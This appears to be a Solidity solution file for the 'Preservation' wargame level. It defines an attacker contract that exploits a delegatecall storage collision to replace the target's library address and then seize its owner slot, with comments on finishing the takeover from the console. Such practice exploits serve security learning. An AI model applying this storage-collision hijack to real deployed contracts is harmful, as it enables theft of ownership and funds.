// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Unpreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor(Preservation preservation) {
        uint256 addr = uint256(uint160(address(this)));

        // this will change the contract's address to this one
        preservation.setFirstTime(addr);

        // this will trigger our own setFirstTime and change the owner
        // since we use the correct storage layout ;D (This is insane)
        // if this doesn't work for any reason you can just call through web console
        // `await contract.setFirstTime(player)`
        // as the previous call will have overridden the contract anyways
        // preservation.setFirstTime(uint256(uint160(address(msg.sender))));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
